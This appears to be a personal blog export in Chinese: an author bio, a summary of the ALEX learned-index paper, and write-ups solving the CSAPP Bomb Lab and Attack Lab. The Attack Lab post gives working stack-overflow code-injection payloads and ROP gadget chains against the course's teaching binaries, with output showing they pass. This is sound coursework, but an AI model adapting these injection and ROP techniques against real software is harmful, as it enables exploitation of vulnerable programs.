{"pages":[{"title":"About Me","text":"I am a 3rd-year master’s student in computer system architecture at HUST advised by Jiguang Wan. Prior to HUST, I received my B.Eng. in software engineering in 2021 from Wuhan University. ResearchI am interested in database management systems, storage systems, video analytics, and distributed systems. My current research focus is designing innovative edge-cloud collaboration approaches for reshaping cloud infrastructure. Publications Shoggoth: Towards Efficient Edge-Cloud Collaborative Real-Time Video Inference via Adaptive Online Learning [paper, slides] Liang Wang*, Kai Lu*, Nan Zhang, Xiaoyang Qu, Jianzong Wang, Jiguang Wan, Guokuan Li, Jing Xiao The 60th ACM/IEEE Design Automation Conference (DAC’ 23), 2023. Internships Ping An Technology Algorithm Engineer Intern | 02/2022 - 08/2023, Shenzhen, China Work on the MetaEdge project. Huawei Cloud Cloud Infrastructure Software Engineer Intern | 11/2020 - 04/2021, Shenzhen, China Work on the SFS Turbo 2.0 project. PingCAP Talent Plan Intern | 07/2019 - 08/2019, Beijing, China Design Index Advisor for TiDB. Contact iggiewang@gmail.com","link":"/about/index.html"}],"posts":[{"title":"Attack Lab","text":"本文记录 CSAPP 的 Attack Lab 完成方案。 1. ctarget 部分Level 1level 1 要求我们在 getbuf 输入字符串后，利用溢出来重写栈中 getbuf 函数返回的地址，让函数调用 touch1。 12345670000000000401713 &lt;getbuf&gt;: 401713: 48 83 ec 38 sub $0x38,%rsp 401717: 48 89 e7 mov %rsp,%rdi 40171a: e8 3b 02 00 00 callq 40195a &lt;Gets&gt; 40171f: b8 01 00 00 00 mov $0x1,%eax 401724: 48 83 c4 38 add $0x38,%rsp 401728: c3 retq 根据这段汇编代码我们可以确定，getbuf 在栈中分配了0x38比特的内存来存储输入的字符串。如果我们输入的字符串长度超过 56，就可以覆盖掉 getbuf 的返回地址了，所以，我们只需要把输入的第 56-63 个字符填写为 touch1 函数的地址就行了。需要注意的是，我们输入的字符应该用两位十六进制数来表示，然后通过 hex2raw 来将其转换成字符串。另外，我这里数据都是用小端法来保存的，所以低位在前： 1234567800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 29 17 40 00 00 00 00 00 Level 2level 2 要求我们注入我们自己写的代码，并把程序转移到我们写的代码处运行，也就是执行 touch2。如何通过我们的代码跳转到 touch2 函数？首先，我们需要找到缓冲区的起始地址，在 getbuf 处打断点，查看 $rsp： 12(gdb) p $rsp$1 = (void *) 0x5565fd40 可以知道，0x5565fd40 - 0x38 = 0x5565fd08 就是缓冲区的起始地址，我们需要和前面的 level 1 一样，让缓冲区溢出，56-63 个字符填写为缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码，这样程序才能执行我们想要的结果。我们注入的代码逻辑应该是： 将 cookie 值赋给 %edi 作为 touch2 函数的参数 将 touch2 函数的地址入栈 ret，让函数执行 touch2 转为汇编就是： 123movl $0x2a2e4a08, %edipushq $0x0000000000401755ret 这里需要用到 gcc 内联汇编的方法，编写 level2.c : 12345678910int main(void){ asm ( &quot;movl $0x2a2e4a08, %edi\\n\\t&quot; &quot;pushq $0x0000000000401755\\n\\t&quot; &quot;ret&quot; ); return 0;} 编译并查看其反汇编代码： 12gcc level2.c -o level2.outobjdump -d level2.out 可以看到我们想要的汇编代码： 1234004f1: bf 08 4a 2e 2a mov $0x2a2e4a08,%edi4004f6: 68 55 17 40 00 pushq $0x4017554004fb: c3 retq 那么我们在缓冲区注入字符就是： 12345678bf 08 4a 2e 2a 68 55 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 fd 65 55 00 00 00 00 Level 3level 3 要求我们执行 touch3，touch3 接收的参数是 cookie 的字符串的地址。有了 level 2 的经验，我们知道需要在 56-63 个字符填写缓冲区的起始地址，另外在缓冲区的起始处注入我们自己写的代码。我们把 cookie 字符串放在第 64-71 个字符，这样，我们注入的代码就是： 123movl $0x5565fd48, %edipushq $0x0000000000401829ret 0x5565fd08 + 64 = 0x5565fd48 是 cookie 字符串的地址，0x0000000000401829 是 touch3 函数地址。同样地，用 gcc 内联汇编的方法得到汇编代码，最终我们在缓冲区注入字符就是： 123456789bf 48 fd 65 55 68 29 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 fd 65 55 00 00 00 0032 61 32 65 34 61 30 38 2. rtarget 部分Level 2与之前的 level 2 相同，我们需要为 %rdi 赋上 cookie 值，再跳转到 touch2 函数执行，跳转到 touch2 只需要将 touch2 的入口地址放在最后一个 gadget 之后，在它的 ret 指令执行之后就会返回到 touch2 中。查看 farm.s： 123000000000000001b &lt;getval_188&gt;: 1b: b8 3c cd 58 c3 mov $0xc358cd3c,%eax 20: c3 retq 58 c3 对应 popq %rax，这条指令的地址是 0x1b + 3 = 0x1e。 1230000000000000028 &lt;setval_279&gt;: 28: c7 07 48 89 c7 c3 movl $0xc3c78948,(%rdi) 2e: c3 retq 48 89 c7 c3 对应 movq %rax,%rdi，这条指令的地址是 0x28 + 2 = 0x30。再查看 rtarget.s： 12300000000004018b1 &lt;start_farm&gt;: 4018b1: b8 01 00 00 00 mov $0x1,%eax 4018b6: c3 retq start_farm 的起始地址是 0x4018b1。所以 popq %rax 这条指令最终的地址是 0x1e + 0x4018b1 = 0x4018cf；所以 movq %rax,%rdi 这条指令最终的地址是 0x30 + 0x4018b1 = 0x4018e1。level 2(rtarget) 最终结果为： 123456789101100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cf 18 40 00 00 00 00 00 /* popq %rax */08 4a 2e 2a 00 00 00 00 /* 将 cookie 存入 %rax */e1 18 40 00 00 00 00 00 /* movq %rax,%rdi */55 17 40 00 00 00 00 00 /* 返回到 touch2 */ Level 3与之前的 level 3 相同，需要将 %rdi 指向 cookie 的字符串表示的首地址。我们需要把 cookie 字符串放在高地址，根据 %rsp 和偏移量去取地址。在 farm.s 中： 1230000000000000042 &lt;add_xy&gt;: 42: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 46: c3 retq lea (%rdi,%rsi,1) %rax 就是 %rax = %rdi + %rsi，所以，只要能够让 %rdi 和 %rsi 其中一个保存 %rsp，另一个保存偏移量，就可以计算出 cookie 存放的地址，然后 movq %rax,%rdi 再调用 touch3 就可以了。所以，分两步走：先保存一个栈顶地址，这里我通过 %rsp -&gt; %rax -&gt; %rdi 保存到 %rdi 中，再将偏移量通过 %eax(%rax) -&gt; %ecx -&gt; %edx -&gt; %esi 保存到 %esi(%rsi) 中。注意，偏移量的值需要等所有指令写完后才能确定。level 3(rtarget) 最终结果为： 1234567891011121314151617181900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1e 19 40 00 00 00 00 00 /* movq %rsp,%rax (48 89 e0) */e1 18 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) */cf 18 40 00 00 00 00 00 /* popq %rax (58) *//* %rdi中保存的是 movq %rsp,%rax 这条指令的栈顶地址，所以最终偏移量为 0x48 */48 00 00 00 00 00 00 00 /* 偏移量 */58 19 40 00 00 00 00 00 /* movl %eax,%ecx (89 c1) */7a 19 40 00 00 00 00 00 /* movl %ecx,%edx (89 ca) */0c 19 40 00 00 00 00 00 /* movl %edx,%esi (89 d6) */f3 18 40 00 00 00 00 00 /* add_xy */e1 18 40 00 00 00 00 00 /* movq %rax,%rdi (48 89 c7) */29 18 40 00 00 00 00 00 /* touch3地址 */32 61 32 65 34 61 30 38 /* 目标字符串 */ 最终结果123456789101112131415161718192021222324252627282930[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-ctarget.l1 | ./ctargetCookie: 0x2a2e4a08Type string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-ctarget.l2 | ./ctargetCookie: 0x2a2e4a08Type string:Touch2!: You called touch2(0x2a2e4a08)Valid solution for level 2 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-ctarget.l3 | ./ctargetCookie: 0x2a2e4a08Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)Valid solution for level 3 with target ctargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-rtarget.l1 | ./rtargetCookie: 0x2a2e4a08Type string:Touch2!: You called touch2(0x2a2e4a08)Valid solution for level 2 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB![root@iZbp10zyqxzc2aoa1tgk8iZ target53]# ./hex2raw &lt; 2017302580193-rtarget.l2 | ./rtargetCookie: 0x2a2e4a08Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)Valid solution for level 3 with target rtargetPASS: Sent exploit string to server to be validated.NICE JOB! repoMy solutions to CSAPP labs","link":"/2021/01/21/Attack-Lab/"},{"title":"ALEX: An Updatable Adaptive Learned Index","text":"概述ALEX 是一个可更新的内存型学习索引。对比 B+Tree 和 Learned Index，ALEX 的目标是：(1)插入时间与 B+Tree 接近，(2)查找时间应该比 B+Tree 和 Learned Index 快，(3)索引存储空间应该比 B+Tree 和 Learned Index 小，(4)数据存储空间（叶子节点）应该与 B+Tree 相当。 ALEX 的设计如下： ALEX 动态调整 RMI 的形状和高度，节点可以进行扩展和分割 ALEX 使用 Exponential Search 来寻找叶子层的 key，以纠正 RMI 的错误预测，这比 Binary Search 效果更好 ALEX 在数据节点上使用 Gapped Array(GA)，将数据插入在自己预测的地方。这和 RMI 有很大的不同。RMI 是先排好序，让后训练模型去拟合数据。而 ALEX 是在模型拟合完数据后，将数据在按照模型的预测值插入到对应的地方，这大大降低了预测的错误率 ALEX 的 RMI 结构的目标不是产生同等大小的数据节点，而是产生 key 分布大致为线性的数据节点，以便线性模型能够准确地拟合。因此，ALEX 中的内部节点更加灵活。例如下图中节点 A 中 keys 的范围在 [0,1) 内，并有四个指针。ALEX 将 keys 范围 [0,1/4) 和 [1/2,1) 分配给数据节点（因为这些空间的 CDF 是线性的），并将 [1/4,1/2) 分配给另一个内部节点（因为CDF是非线性的，RMI需要对这个空间进行更多的划分）。另外，多个指针可以指向同一个子节点，便于插入；限制每个内部节点的指针数量总是 2 的幂，便于节点可以在不重新训练的情况下分裂 下面介绍 ALEX 的查询、插入、删除等步骤。 Lookups and Range Queries查找时，从 RMI 的根节点开始，使用模型计算在哪一个位置，然后迭代地查询下一级的叶子节点，直到到达一个数据节点。在数据节点中使用模型来查询 key 在数组中的位置，如果预测失败，则进行 Exponential Search 以找到 key 的实际位置。如果找到了一个 key，读取对应值并返回记录，否则返回一个空记录。对于范围查询，首先找到第一个 key 的位置，该 key 不小于范围的起始值，然后扫描，直到到达范围的结束值，使用节点的 bitmap 跳过间隙，必要时跳到下一个数据节点。 Insert in non-full Data Node插入逻辑与上述查找算法相同。在一个 non-full 的数据节点中，使用数据节点中的模型来预测插入位置。如果预测的位置不正确（不能保持有序），则做 Exponential Search 来找到正确的插入位置。如果插入位置为空，则直接插入，否则插入到最近的间隙中。Gapped Array实现了 O(logn) 插入时间。 Insert in full Data NodeCriteria for Node FullnessALEX 并不会让数据节点 100% 充满，因为在 Gapped Array 上的插入性能会随着间隙数量的减少而下降。需要在 Gapped Array 上引入了密度的下限和上限：dl, du ∈ (0, 1)，约束dl &lt; du。密度被定义为被元素填充的位置的百分比。如果下一次插入使得密度超过了 du，那么这个节点就是满的。默认情况下，我们设置 dl=0.6，du=0.8。相比之下，B+Tree 的节点通常有 dl=0.5 和 du=1。 Node Expansion Mechanism扩展一个包含 N 个 key 的数据节点，需要创建一个具有 N/dl 槽的新的较大的 Gapped Array。然后对线性回归模型进行缩放或重新训练，然后使用缩放或重新训练的模型对这个节点中的所有元素进行基于模型的插入。新的数据节点的密度处于下限 dl。下图为一个数据节点扩展的例子，数据节点内的 Gapped Array 从左边的两个槽扩展到右边的四个槽。 Node Split Mechanism 水平分裂。有两种情况：(1) 如果待分裂的数据节点的父内部节点还没有达到最大的节点大小，父内部节点的指针数组可能有多余的指向待分裂数据节点的指针。如果有，则各让一半的指针指向两个新数据节点。否则，将父节点的指针数组的大小增加一倍，并为每个指针制作一个冗余的副本，来创建第二个指向分裂数据节点的指针，然后再分裂。下图(a)展示了一个不需要扩展父内部节点的侧向分裂的例子。(2) 如果父内部节点已经达到最大节点大小，那么我们可以选择拆分父内部节点，如下图(b)中所示。因为内部节点的大小为2的幂，所以总是可以拆分一个数据节点，不需要对拆分后的任何模型进行重新训练。分裂可以一直传播到根节点，就像在 B+Tree 中一样。 向下分裂。如下图(c)所示，向下分裂将一个数据节点转换为具有两个子数据节点的内部节点。两个子数据节点中的模型是根据它们各自的 key 来训练的。 Delete and update要删除一个 key，需要先找到该 key 的位置，然后删除它和它对应的值。删除不会移动任何现有的 key，所以删除是一个严格意义上的比插入更简单的操作，不会导致模型的准确性下降。如果一个数据节点由于删除而达到了密度下限 dl，那么就缩小数据节点（与扩大数据节点相反），以避免空间利用率过低。此外还可以使用节点内的成本模型来确定两个数据节点是否应该合并在一起，然而为了简单起见，ALEX 开源代码中并没有实现这些合并操作。key 更新是通过结合插入和删除来实现的；值更新是通过查找 key 并将新值写入来实现的。 参考 ALEX: An Updatable Adaptive Learned Index","link":"/2021/10/01/ALEX-An-Updatable-Adaptive-Learned-Index/"},{"title":"Bomb Lab","text":"本文记录 CSAPP 的 Bomb Lab 完成方案。 bomb 1在 phase_1 中， 调用 strings_not_equal 函数： 12345678910000000000000140f &lt;phase_1&gt;: 140f: 48 83 ec 08 sub $0x8,%rsp 1413: 48 8d 35 36 1d 00 00 lea 0x1d36(%rip),%rsi # 3150 &lt;_IO_stdin_used+0x150&gt; 141a: e8 f0 04 00 00 callq 190f &lt;strings_not_equal&gt; 141f: 85 c0 test %eax,%eax 1421: 75 05 jne 1428 &lt;phase_1+0x19&gt; 1423: 48 83 c4 08 add $0x8,%rsp 1427: c3 retq 1428: e8 ee 05 00 00 callq 1a1b &lt;explode_bomb&gt; 142d: eb f4 jmp 1423 &lt;phase_1+0x14&gt; 如果字符串不相等，函数返回 1，jne 指令发生跳转，进入 explode_bomb 函数；如果字符串相等的话，函数返回 0，jne 指令不发生跳转，直接退出。strings_not_equal 函数有两个参数，分别为%rdi和%rsi: 12345678000000000000190f &lt;strings_not_equal&gt;: 190f: 41 54 push %r12 1911: 55 push %rbp 1912: 53 push %rbx 1913: 48 89 fb mov %rdi,%rbx 1916: 48 89 f5 mov %rsi,%rbp 1919: e8 d4 ff ff ff callq 18f2 &lt;string_length&gt; ... 一个参数为字符串输入，另一个参数由 phase_1 传入。因此，用 gdb 在 strings_not_equal 处进行断点调试，便可得出答案： 12345678910111213(gdb) break strings_not_equalBreakpoint 1 at 0x190f(gdb) runStarting program: /mnt/c/ubuntu/bomb65/bomb Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!testBreakpoint 1, 0x000000000800190f in strings_not_equal ()(gdb) p (char*)$rdi$1 = 0x80056a0 &lt;input_strings&gt; &quot;test&quot;(gdb) p (char*)$rsi$2 = 0x8003150 &quot;I am just a renegade hockey mom.&quot; 第一关答案为 I am just a renegade hockey mom. 。 bomb 2直接看 phase_2： 1234567891011121314151617181920212223242526000000000000142f &lt;phase_2&gt;: ... 143e: 48 89 44 24 18 mov %rax,0x18(%rsp) 1443: 31 c0 xor %eax,%eax 1445: 48 89 e6 mov %rsp,%rsi 1448: e8 f4 05 00 00 callq 1a41 &lt;read_six_numbers&gt; 144d: 83 3c 24 00 cmpl $0x0,(%rsp) -&gt; arr[0] = 0 1451: 75 07 jne 145a &lt;phase_2+0x2b&gt; 1453: 83 7c 24 04 01 cmpl $0x1,0x4(%rsp) -&gt; arr[1] = 1 1458: 74 05 je 145f &lt;phase_2+0x30&gt; 145a: e8 bc 05 00 00 callq 1a1b &lt;explode_bomb&gt; 145f: 48 89 e3 mov %rsp,%rbx -&gt; %rbx = arr[0] 1462: 48 8d 6b 10 lea 0x10(%rbx),%rbp -&gt; %rbp = arr[4] 1466: eb 0e jmp 1476 &lt;phase_2+0x47&gt; 1468: e8 ae 05 00 00 callq 1a1b &lt;explode_bomb&gt; 146d: 48 83 c3 04 add $0x4,%rbx -&gt; %rbx = arr[1] 1471: 48 39 eb cmp %rbp,%rbx -&gt; if (%rbx == arr[4]) 1474: 74 0c je 1482 &lt;phase_2+0x53&gt; 1476: 8b 43 04 mov 0x4(%rbx),%eax -&gt; %eax = arr[1] 1479: 03 03 add (%rbx),%eax -&gt; %eax = arr[0] + arr[1] 147b: 39 43 08 cmp %eax,0x8(%rbx) -&gt; if (%eax == arr[2]) 147e: 74 ed je 146d &lt;phase_2+0x3e&gt; 1480: eb e6 jmp 1468 &lt;phase_2+0x39&gt; 1482: 48 8b 44 24 18 mov 0x18(%rsp),%rax 1487: 64 48 33 04 25 28 00 xor %fs:0x28,%rax ... 在 147b 处，若 arr[2] = arr[0] + arr[1]，则函数继续跳转到 146d 处执行，这时 %rbx 的保存的地址由 arr[0] 变为 arr[1]，接下来判断 arr[3], arr[4]……直到 %rbx == arr[4]，也就是判断完了 arr[5] 后停止。因此可以得出，这 6 个数由前两项分别为 0 和 1 的斐波拉契数列组成。第二关答案为 0 1 1 2 3 5 。 bomb 3在 phase_3 中： 1214c1: e8 5a fc ff ff callq 1120 &lt;__isoc99_sscanf@plt&gt;14c6: 83 f8 01 cmp $0x1,%eax 在 14c6 处打断点，输入多个数后，打印 %eax 中的值： 12(gdb) i r eaxeax 0x2 2 可以判断，在 phase_3 中，我们需要输入两个数。再观察以下代码： 1214cb: 83 3c 24 07 cmpl $0x7,(%rsp)14cf: 77 4b ja 151c &lt;phase_3+0x7e&gt; 我们输入的第一个数不能大于 7。再向下看： 1234567891011121314151617181920212214db: 48 63 04 82 movslq (%rdx,%rax,4),%rax14df: 48 01 d0 add %rdx,%rax14e2: ff e0 jmpq *%rax14e4: e8 32 05 00 00 callq 1a1b &lt;explode_bomb&gt;14e9: eb e0 jmp 14cb &lt;phase_3+0x2d&gt;14eb: b8 ab 00 00 00 mov $0xab,%eax14f0: eb 3b jmp 152d &lt;phase_3+0x8f&gt;14f2: b8 ea 01 00 00 mov $0x1ea,%eax14f7: eb 34 jmp 152d &lt;phase_3+0x8f&gt;......152d: 39 44 24 04 cmp %eax,0x4(%rsp)1531: 75 15 jne 1548 &lt;phase_3+0xaa&gt;1533: 48 8b 44 24 08 mov 0x8(%rsp),%rax1538: 64 48 33 04 25 28 00 xor %fs:0x28,%rax153f: 00 00 1541: 75 0c jne 154f &lt;phase_3+0xb1&gt;1543: 48 83 c4 18 add $0x18,%rsp1547: c3 retq 1548: e8 ce 04 00 00 callq 1a1b &lt;explode_bomb&gt;154d: eb e4 jmp 1533 &lt;phase_3+0x95&gt;154f: e8 2c fb ff ff callq 1080 &lt;__stack_chk_fail@plt&gt; 可以看到这是 switch 的特征，根据 %rax 中的地址进行跳转，跳转后将数存入 %eax 中， 再跳入 152d 处将数与输入的第二个参数进行比较，如果不相等则触发炸弹爆炸。在这里我输入的第一个参数为 1，用 gdb 调试，查看 %rax 存储的地址： 12(gdb) i r raxrax 0x80014eb 134223083 这里将跳转至 14eb 处，即输入的第二个参数应该是 0xab，才不会发生爆炸。因此，第三关答案为 1 171 (答案不唯一)。 bomb 4和 phase_3 一样，接收两个参数： 1215b9: 83 f8 02 cmp $0x2,%eax15bc: 75 06 jne 15c4 &lt;phase_4+0x33&gt; 并且第一个参数不能大于 15： 1215be: 83 3c 24 0e cmpl $0xe,(%rsp)15c2: 76 05 jbe 15c9 &lt;phase_4+0x38&gt; func4 的返回值必须要等于 3，并且第二个参数也要等于 3，负责触发炸弹爆炸： 123456789101115c9: ba 0e 00 00 00 mov $0xe,%edx15ce: be 00 00 00 00 mov $0x0,%esi15d3: 8b 3c 24 mov (%rsp),%edi15d6: e8 79 ff ff ff callq 1554 &lt;func4&gt;15db: 83 f8 03 cmp $0x3,%eax15de: 75 07 jne 15e7 &lt;phase_4+0x56&gt;15e0: 83 7c 24 04 03 cmpl $0x3,0x4(%rsp)15e5: 74 05 je 15ec &lt;phase_4+0x5b&gt;15e7: e8 2f 04 00 00 callq 1a1b &lt;explode_bomb&gt;15ec: 48 8b 44 24 08 mov 0x8(%rsp),%rax15f1: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 再看看 func4： 12345678910111213141516171819202122230000000000001554 &lt;func4&gt;: 1554: 48 83 ec 08 sub $0x8,%rsp 1558: 89 d0 mov %edx,%eax 155a: 29 f0 sub %esi,%eax 155c: 89 c1 mov %eax,%ecx 155e: c1 e9 1f shr $0x1f,%ecx 1561: 01 c1 add %eax,%ecx 1563: d1 f9 sar %ecx 1565: 01 f1 add %esi,%ecx 1567: 39 f9 cmp %edi,%ecx 1569: 7f 0c jg 1577 &lt;func4+0x23&gt; 156b: b8 00 00 00 00 mov $0x0,%eax 1570: 7c 11 jl 1583 &lt;func4+0x2f&gt; 1572: 48 83 c4 08 add $0x8,%rsp 1576: c3 retq 1577: 8d 51 ff lea -0x1(%rcx),%edx 157a: e8 d5 ff ff ff callq 1554 &lt;func4&gt; 157f: 01 c0 add %eax,%eax 1581: eb ef jmp 1572 &lt;func4+0x1e&gt; 1583: 8d 71 01 lea 0x1(%rcx),%esi 1586: e8 c9 ff ff ff callq 1554 &lt;func4&gt; 158b: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 158f: eb e1 jmp 1572 &lt;func4+0x1e&gt; 说几个值得注意的点： 123456155a: 29 f0 sub %esi,%eax155c: 89 c1 mov %eax,%ecx155e: c1 e9 1f shr $0x1f,%ecx1561: 01 c1 add %eax,%ecx1563: d1 f9 sar %ecx1565: 01 f1 add %esi,%ecx 这几行的意思是，如果 %eax &lt; %esi 的话，%ecx = (%eax - %esi + 1) / 2 + %esi = (%eax + %esi + 1) / 2，否则 %ecx = (%eax + %esi) / 2。接下来再看： 123451567: 39 f9 cmp %edi,%ecx1569: 7f 0c jg 1577 &lt;func4+0x23&gt;156b: b8 00 00 00 00 mov $0x0,%eax1570: 7c 11 jl 1583 &lt;func4+0x2f&gt;1572: 48 83 c4 08 add $0x8,%rsp 只有当 %edi = %ecx 时，函数才会退出。最后再看： 123456781577: 8d 51 ff lea -0x1(%rcx),%edx157a: e8 d5 ff ff ff callq 1554 &lt;func4&gt;157f: 01 c0 add %eax,%eax1581: eb ef jmp 1572 &lt;func4+0x1e&gt;1583: 8d 71 01 lea 0x1(%rcx),%esi1586: e8 c9 ff ff ff callq 1554 &lt;func4&gt;158b: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax158f: eb e1 jmp 1572 &lt;func4+0x1e&gt; 这段代码也就是修改 %rcx 的值，传递参数，递归调用。整个 func4 汇编代码用 Python 表示可以是： 123456789101112def func4(a, c, d): if d &lt; c: b = (d + c + 1) / 2 else: b = (d + c) / 2 if b &lt; a: return func4(a, b+1, d)*2 + 1 if b &gt; a: return func4(a, c, b-1)*2 else: return 0 因此，第四关答案为 13 3 或者 12 3。 bomb 5与 phase_3 类似，首先我们知道输入的数至少有2个： 1231629: e8 f2 fa ff ff callq 1120 &lt;__isoc99_sscanf@plt&gt;162e: 83 f8 01 cmp $0x1,%eax1631: 7e 5a jle 168d &lt;phase_5+0x87&gt; 然后我们输入的一个参数的二进制后四位不能为1111(15)： 123451633: 8b 04 24 mov (%rsp),%eax1636: 83 e0 0f and $0xf,%eax1639: 89 04 24 mov %eax,(%rsp)163c: 83 f8 0f cmp $0xf,%eax163f: 74 32 je 1673 &lt;phase_5+0x6d&gt; 接下来分析数组，用 gdb 调试： 1234(gdb) p/x *(int *)($rsi)@100$1 = {0xa, 0x2, 0xe, 0x7, 0x8, 0xc, 0xf, 0xb, 0x0, 0x4, 0x1, 0xd, 0x3, 0x9, 0x6, 0x5, 0x79206f53, ......}(gdb) p *$rsi@16$2 = {10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5} 这个数组一共有 16 位，数组中的元素为 {10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5}。接下来的汇编代码表示一个循环，寄存器 %edx 初值定为 0，每次循环加 1，根据后面 cmp 0xf, %edx 可以得出，循环必须执行 15 次；同时ecx寄存器不断的累加数，每次把一个数的值存到 %eax 寄存器中，并且作为下次取值的索引，即对于每对索引 i 和值 v 而言，下一个 v' 位于索引 v 处，相当于构成了一个环形链表。另外，传入的第一个参数不能为 15，并且在遍历过程中，根据 cmp $0xf,%eax，%eax 也不能等于15。索引 15 对应的值为 5， 因此，传入的第一个参数必须是 5，累加循环从索引 5 对应的值开始，这样才能保证能够循环 15 次，对 15 个遍历到的值进行累加，累加和为 (0 + 15) * 16 / 2 -5 = 115。因此，第五关答案为 5 115。 bomb 6phase_6 汇编代码太多，需要花费一定的时间。首先，进入函数做一些初始化的工作后，根据 jmpq 177a &lt;phase_6+0xe1&gt; ，函数会跳转到 177a 处执行： 123456789101112131415161718175d: 48 83 c3 01 add $0x1,%rbx1761: 83 fb 05 cmp $0x5,%ebx1764: 7f 0c jg 1772 &lt;phase_6+0xd9&gt;1766: 41 8b 44 9d 00 mov 0x0(%r13,%rbx,4),%eax176b: 39 45 00 cmp %eax,0x0(%rbp)176e: 75 ed jne 175d &lt;phase_6+0xc4&gt;1770: eb e6 jmp 1758 &lt;phase_6+0xbf&gt;1772: 49 83 c7 01 add $0x1,%r151776: 49 83 c6 04 add $0x4,%r14177a: 4c 89 f5 mov %r14,%rbp177d: 41 8b 06 mov (%r14),%eax1780: 83 e8 01 sub $0x1,%eax1783: 83 f8 05 cmp $0x5,%eax1786: 0f 87 47 ff ff ff ja 16d3 &lt;phase_6+0x3a&gt;178c: 49 83 ff 06 cmp $0x6,%r151790: 0f 84 47 ff ff ff je 16dd &lt;phase_6+0x44&gt;1796: 4c 89 fb mov %r15,%rbx1799: eb cb jmp 1766 &lt;phase_6+0xcd&gt; 从 177a 处开始看起，首先会判断传入的第一个参数减 1 后是否大于 5，也就是这里需要保证参数不能超过 6。之后跳入 1766 处执行，1766 -&gt; 176e -&gt; 175d -&gt; 1766 构成了一个循环，判断当前参数的后面几个参数是否与当前参数相等，相等则炸弹爆炸。 然后跳到 1772 处执行，判断第二个参数减 1 后是否大于 5……即整个这一部分代码是一个大循环，来保证 6 个参数不大于 6，并且各不相等。接下来，函数会跳到 16dd 处执行： 1234567891011121314151616dd: 48 8d 74 24 20 lea 0x20(%rsp),%rsi16e2: 49 8d 7c 24 18 lea 0x18(%r12),%rdi16e7: 41 8b 0c 24 mov (%r12),%ecx16eb: b8 01 00 00 00 mov $0x1,%eax16f0: 48 8d 15 19 3b 00 00 lea 0x3b19(%rip),%rdx # 5210 &lt;node1&gt;16f7: 83 f9 01 cmp $0x1,%ecx16fa: 7e 0b jle 1707 &lt;phase_6+0x6e&gt;16fc: 48 8b 52 08 mov 0x8(%rdx),%rdx1700: 83 c0 01 add $0x1,%eax1703: 39 c8 cmp %ecx,%eax1705: 75 f5 jne 16fc &lt;phase_6+0x63&gt;1707: 48 89 16 mov %rdx,(%rsi)170a: 49 83 c4 04 add $0x4,%r12170e: 48 83 c6 08 add $0x8,%rsi1712: 4c 39 e7 cmp %r12,%rdi1715: 75 d0 jne 16e7 &lt;phase_6+0x4e&gt; 我们输入的参数数组存放在 %r12 中，根据 lea 0x18(%r12),%rdi 可以得出，%rdi 存放了数组的结束地址。这段代码做的就是根据我们输入的参数将 node 按照顺序放入栈中： 1234567for(int i = 0; i &lt; 6; i++){ %rdx = 0x3b19(%rip); for(int j = 0; j &lt; arr[i]; j++) %rdx = addr + 0x8; %rsi = *%rdx;} 再看之后的代码，将 %rax 指向 %rbx 下一个链表节点： 12341717: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx171c: 48 8b 44 24 28 mov 0x28(%rsp),%rax1721: 48 89 43 08 mov %rax,0x8(%rbx)... 最后，比较链表节点中第一个字段值的大小，如果前一个节点值小于后一个节点值，炸弹爆炸： 12345678179b: 48 8b 5b 08 mov 0x8(%rbx),%rbx179f: 83 ed 01 sub $0x1,%ebp17a2: 74 11 je 17b5 &lt;phase_6+0x11c&gt;17a4: 48 8b 43 08 mov 0x8(%rbx),%rax17a8: 8b 00 mov (%rax),%eax17aa: 39 03 cmp %eax,(%rbx)17ac: 7d ed jge 179b &lt;phase_6+0x102&gt;17ae: e8 68 02 00 00 callq 1a1b &lt;explode_bomb&gt; 在此我们知道数据是根据每个节点中的第一个数升序排列。所以只需要查看初始链表存储的数据即可得出答案： 12345678910111213141516(gdb) i r rdxrdx 0x8005210 134238736(gdb) p *134238736$1 = 581(gdb) p *134238752$2 = 563(gdb) p *134238768$3 = 687(gdb) p *134238784$4 = 154(gdb) p *134238800$5 = 170(gdb) p *134238808$6 = 134238480(gdb) p *134238480$7 = 454 链表节点的值为 581 563 687 154 170 454，由大到小排序的节点编号 3 1 2 6 5 4 即为第六关答案。 